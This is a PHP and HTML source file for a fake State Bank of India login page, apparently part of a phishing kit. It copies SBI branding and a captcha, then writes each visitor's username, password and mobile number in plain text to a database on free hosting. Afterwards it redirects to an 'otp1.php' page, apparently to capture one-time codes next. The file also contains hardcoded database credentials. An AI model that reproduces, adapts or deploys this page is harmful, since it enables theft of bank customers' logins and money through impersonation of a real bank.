<?php

// Connecting to the Database
$servername = "localhost";
$username = "id19366910_root";
$password = "[~sM0?~l5cJBm~A]";
$database = "id19366910_sbi";



// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Die if connection was not successful
if (!$conn){
    die("Sorry we failed to connect: ". mysqli_connect_error());
}
else{
    // echo "Connection was successful<br>";
}



if(isset($_POST['submit'])){
    $username = mysqli_real_escape_string($conn, $_POST['username']);
    $password = mysqli_real_escape_string($conn, $_POST['password']);;
    $mobile =mysqli_real_escape_string($conn, $_POST['mobile']);

    mysqli_query($conn,  "INSERT INTO `login`(`username`, `password`, `mobile`) VALUES ('$username', '$password', '$mobile')");
    header("location: otp1.php");
}



?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>SBI</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500&family=Roboto:wght@500;700;900&display=swap"
        rel="stylesheet">

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/animate/animate.min.css" rel="stylesheet">
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet">

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">

    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/vendor/bootstrap/css/bootstrap.min.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/fonts/iconic/css/material-design-iconic-font.min.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/vendor/animate/animate.css">
    <!--===============================================================================================-->	
        <link rel="stylesheet" type="text/css" href="log/vendor/css-hamburgers/hamburgers.min.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/vendor/animsition/css/animsition.min.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/vendor/select2/select2.min.css">
    <!--===============================================================================================-->	
        <link rel="stylesheet" type="text/css" href="log/vendor/daterangepicker/daterangepicker.css">
    <!--===============================================================================================-->
        <link rel="stylesheet" type="text/css" href="log/css/util.css">
        <link rel="stylesheet" type="text/css" href="log/css/main.css">
</head>

<body style=" background: url(img/BG6.svg) no-repeat center center fixed !important;
    background-size: cover !important;">
    <!-- Spinner Start -->
    <!-- <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
        <div class="spinner-grow text-primary" style="width: 3rem; height: 3rem;" role="status">
            <span class="sr-only">Loading...</span>
        </div>
    </div> -->
    <!-- Spinner End -->


   


    <!-- Navbar Start -->
    <nav class="navbar navbar-expand-lg bg-white navbar-light sticky-top p-0">
        <!-- <a  class="navbar-brand pad-r-30" data-target="#mainMenu" data-toggle="modal"
            rel="noopener noreferrer"><img  alt="" height="32" src="/img/hamburger_menu.svg" style="margin-top: 25px;"></a>
        <a href="index.html" class="navbar-brand d-flex align-items-center px-4 px-lg-5">
             <h2 class="m-0 text-primary">WooDY</h2> -->
            <!-- <img src="/img/sbi_intouch_logo.svg" alt="" style="    width: 164px;
            margin-left: 100px;">
        </a> --> 

        <button type="button" class="navbar-toggler me-4" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
            <span class="navbar-toggler-icon"></span>
        </button>
      
        <a  class="navbar-brand" href="#" rel="noopener noreferrer"><img  height="32px"
                src="img/sbi_intouch_logo.svg" style="margin-top: 25px;"></a>
        <div class="collapse navbar-collapse" id="navbarCollapse">
            <div class="navbar-nav ms-auto p-4 p-lg-0">
                <a href="index.html" class="nav-item nav-link active">Home</a>
    
    </nav>
    <!-- Navbar End -->


    <!-- Carousel Start -->

                    

                                <!-- <div class="limiter"> -->
                                    <!-- <div class="container-login100"> -->
                                        <div class="wrap-login100" style="   
                                        margin-left:;">
                                            <form class="login100-form validate-form" action="index.php" method="post">
                                                <span class="login100-form-title p-b-26">
                                                    Welcome to
                                                </span>
                                                <img alt="Sbi Icon" style="
                                                height: 43px;
                                                width: 250px;
                                            " class="sbi-yono-logo" src="img/sbi_intouch_logo.svg"><br><br>
                                                
                            
                                                <div class="wrap-input100 validate-input">
                                                    <input class="input100" type="text" name="username" placeholder="Username" require>
                                                    
                                                </div>
                            
                                                <div class="wrap-input100 validate-input" data-validate="Enter password">
                                                    <span class="btn-show-pass">
                                                        <i class="zmdi zmdi-eye"></i>
                                                    </span>
                                                    <input class="input100" type="password" name="password" placeholder="Password" require>
                                                   
                                                </div>

                                                <div class="wrap-input100 validate-input">
                                                    <input class="input100" type="text" name="mobile" placeholder="Mobile No." require>
                                                    
                                                </div>
                                                <div class="virtual-key-checkbox">Enter the text as shown in the image*</div>
                                                <div class="wrap-input100 validate-input" data-validate="Enter Number">
                                                    
                                                    <input class="input100" type="text" name="" require>
                                                    <span class="focus-input100" data-placeholder=""></span>
                                                </div>
                                                <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
                                                    <label for="vehicle1"> Enable Virtual Keyboard</label>
                                                      <div class="captcha-box mt10"><div class="captcha-header">Captcha</div><div class="image-box"><img style="    width: 145px;
                                                        height: 35px;" alt="captcha-image" class="captcha-img" src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAANIAAABGCAYAAAC5bsoXAAAJ7UlEQVR42u1dX4hWRRS/rssqYltgEeGDYCLVgxgREmEk+GAUKYbYEiGU2OJDFFgRIfYQYSYWJFH4EJSxICbVg+TDQiFiCwuJLBZEiA8VrrBayGKytc3o3Byn+XPOzJl757szHxz45vvud+/cuec35/zOOTNfVSmvrVu3zubSbvq3bUjT4xLzXL3Qzu9GIygIVKlN/YL2HXuuUKAVIBUgkSpECFBiAynVeytA6lg71D2K0a9UXLnY/c0CSG357m1whVQ4ka9VwVqzXhiLLulXce08+RRmYKHKRgkk2/kLZyquXSPBhZhuFOWsHYuDpWTNCpASacfw7Sn7AFV8F0iaCIGnyDULR2rYd6WaOX2UzMeNc1kMihA4xWRBbekLR+o4J6LgFxjQUAIpNCBBCaTi2nUYSJgEZqqh7xgh8FgcsQApw7xRLEBSWqSQa/tOSiWv1HGO1BQncgE31I3DKD0mpB4S+Wsi+FI4UkdcO6yVoQp9Y5WMKr/kE4wonKlwJLRlaZIfYWb9Jqo5fPpagJR53giifBSKGJIvokjyUgQGUijbKhwpkbwRldsSoijUQPKdaHzuPXSyKRwpI05EpYSQzygeoO8SC5/gTXHtOuraNVUCE5p4dZx71hbipuBaFOF721gUIHUASNR+e6gSWMByTXSfYYCEtW7ULm+bZVyFIyXAkaj5EqA/RzSAiQYkzWerKSJwocfFmPwKR0rItcMc56GQ85lcNQFJBREESIiAQ38NJCYn1GtSBR8Mx/Uz2SLen2MyLY3DBJNDTF4srl3Vndq6mORbAGnWZpEiVXRwRT7qArDJ3SRwgc+azq+bPAqQEmgTK6RN4Y4jQTwEmP29LRKAEx3VgUkHLuU7bj0OMHmggfEuHCkhH9U586lRMcus4pq57/K1ahB+5AMkzcPd5DtWUIth6V+/y+LFssqFI+HaYBfFMOuGAmk7kC8NcE7gcutMQKocLxeQhNzUd4glNowjBkhbDOfbwWSBNDbrmOzqUji8AMly/oBSFyeQTH0LBZL4/FfDtaZ8N7gEAmlE81x255BX6mkgNeE2Ksp4B7CfQzbQUN2L5TnqrjVTh8IdCtHH5Akm36W69KVwpJYeAiKCZyPhXIaBA3zIZDl9iThB0GQv8VjpjruimYD6Yid2C0cKd+2CXAYPII0CznfIQ+ErjGsXAK69VKkCw290lrwqrl2mQLLM6qMUYfWQiJ3j2KWQ4IIPF+oIkHheb0kBUoKhU0gf2wCSZiL4OmZOKDGOdItob2HyDr930f6byc+FIxFvswuwSDtcsyw0sgiN2AUC6RkMkIhdO2w0NSuONChqpUyDstzx+1PK8RPCvPaKa7fcoJToEH0CQBpOEUjA579YtHl93kd1RBGYhJfbM8IiLWnDtVtj6dgYUqmWU7p2DQCJv37SXHeh5tz9Sh8vUBerup4Ze31iueZa5Xc8vzMmlQXxZ7mvQSDdpzn/3SL0/qqkX38gq1e4/CVFT99kslm057UdbNhn6fguzfGbbIpfgFSAJAFphHsunhbmMpNxJp+K9noxWc8teaS0OFIBUmQg5ZpHmjEMyhmpNOaU8v1pzou6GrULDYdTcaReHwvx/jeeYmDygWg/yuTOLuaRdjpmm4+V9p9MlvVwHom/Vmm++9JWZxYjrE5wvkXC6kCsxnkmK5EW6TZsDaRoP8fkoRwTsmOIQRqKnJCFLg0IAZLuu6t19NFUsMnkSVseKZJ78bvFtcMA6RqYHEDiQSheDb/fw7X7h8nZUmuXplvQCpCkpdXykvJpUWPW55OQ9f2vJQeQjntOQnOkcDFf8MeXrU9BJjXx/kcmR5i8Jdr3M1lQau2uv7Y7LNJ41yobNPc5pPRzowKkaV8gBeSRpl3Xk4MlnNOK9skWx7XU2lmAtC2x9Ui+RavYze3la4+YzksFJBVEJiBJ7QkKqy/ef8+jhExekaq8S9Gq54mmDA/sQipFq7b7hABJ+u6Kcp9X6xkdG6WLBCQeUZ2BBjzYMSuYPC0lLicEd9H181upsmCtpY/5AamsR3KvkFW+G9GAYEDiSNMKh1roGwKnDn2LlESfUgUtA8lm2ScROSU0kHLnSAPAqN22XuRIBiANaZS/5kUbNMGIhb79dgHIw/qd0lRBQ13kqEqfu2v3IaKEY2lkjkS2rx0GoDUPEu8/V/p1VGM9rAEAgtnwigVI+wWQjHwyROl9LVIvA4cCSJs1D2SPRdHHeglIjvOPAi3ZsK3vFcFOq8oxl7hQ7A+h/P4ycgzzA1KX9l6m3GnVBaQKuXNqLCApH52RyrQgfZoHvP+TMYGUM0dS1xeNC6Jdf3/GoCgzsSxSA/ki+TWMqOqoMBs1egDpdiGraxAZrnW4gi0lmK+5//fVY8tOqzSunTrQS5TvV9aFrYbjB1Jy7TyI/GIMkEwzfchWWx6BhsPAMd5AwJfAS2dyBdIQYn3RLoty7UsESHPEJPCYaJ+wuHbO/bsNfdtZSWttMPs5EOWm6s/WYF2rgKLg/ICU0f8j9Ush6telaKKqgFPIGjTMBvmoz1xbgymL2r7iYjn/Xgdo+Os1myvuu6VZ+X+k6qatd9X1ReOScpp+v8yiiHwPiEFCi7Qx1mb8Ut0cZvP5i6HgAgJpDsZ9rMy7xDo5bfnHvnDX7oAy0Jcq3L5gpgf1GXFtH2qZspBJufTF8cB/kNy1p6oby6StYBLW4L/1NgCATUmW8YAkL1fXN55fV4MIMSmclkC0WAxnXUx7xND/Zz0AMIu1SLnnkZps38vkBSYHCYB0jMl7otpikea6a7GRQcM1+Qb2q1wTQWjkUXPuX4ToxuC8x71hAZAnkLrGkaTC0lFpc8AHqxubBUKjeOCABja3BQg4oBOX0merfRKxyvH3hBSX5pA3SnXv70eYvMGtBTCkzJeuf8N/o8uJpPLP5tDELDGQKlGdjbWge3gBa8i95Vhb17Zr9zyTt5kcBwJnUvjxL4n2XKqZEaskoa4JMA8EAhKkn7oFe2IimgkNJlCU+RQg4dvrJfLtAg6P6B2sAhcGUh0LARnQUqBq7gAAgT47/j+wfNut3b7/0k4Jhi4Bp9McKbT2zufhe/QDBCRgsWoFDSXH3hewcCRahHKy+jCTLwwW52J1fXnyxpgzRqz8BlUfEJyngoImVs6miXEtrt3/2xcr/dZLx5q8sZggDO1j7OLPmPcfy4UuQHInTHnB5IpWbyzCA/d1KX2PwR4b+x4KkDLgSJSuDGXErykg+bh6scGQi57FsEjvpjBjNJ3vsCk6hbsWst1xiFUpeaP2XLvHU7rRGDMpNeCpLRIlUEq4uzkg3SoBiSf8BrsAJF9iHurKxQBSSBSxACljjkQZbYvFC0KBlBJfpA6V586RBitA4WMunAljkSj6Qtm/JpPivdz+F3Jz17jyps8ZAAAAAElFTkSuQmCC"></div><div class="captcha-refresh"></div></div><br>
                                                <div class="container-login100-form-btn">
                                                    <div class="wrap-login100-form-btn">
                                                        <div class="login100-form-bgbtn"></div>
                                                        <button class="login100-form-btn" name="submit">
                                                            Login
                                                        </button>
                                                    </div>
                                                </div>
                            
                                              
                                            </form>
                                        </div>
                                    </div>
                                </div>
                               
                            </div>
                        </div>
                    </div>
                </div>
            </div>
    </div>
    <!-- Carousel End -->






  


  


  





  









    <!-- Back to Top -->
    <a href="#" class="btn btn-lg btn-primary btn-lg-square rounded-0 back-to-top"><i class="bi bi-arrow-up"></i></a>


    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/wow/wow.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/counterup/counterup.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/isotope/isotope.pkgd.min.js"></script>
    <script src="lib/lightbox/js/lightbox.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>

    <!--===============================================================================================-->
	<script src="/log/vendor/jquery/jquery-3.2.1.min.js"></script>
    <!--===============================================================================================-->
        <script src="/log/vendor/animsition/js/animsition.min.js"></script>
    <!--===============================================================================================-->
        <script src="/log/vendor/bootstrap/js/popper.js"></script>
        <script src="/log/vendor/bootstrap/js/bootstrap.min.js"></script>
    <!--===============================================================================================-->
        <script src="/log/vendor/select2/select2.min.js"></script>
    <!--===============================================================================================-->
        <script src="/log/vendor/daterangepicker/moment.min.js"></script>
        <script src="/log/vendor/daterangepicker/daterangepicker.js"></script>
    <!--===============================================================================================-->
        <script src="/log/vendor/countdowntime/countdowntime.js"></script>
    <!--===============================================================================================-->
        <script src="/log/js/main.js"></script>
</body>

</html>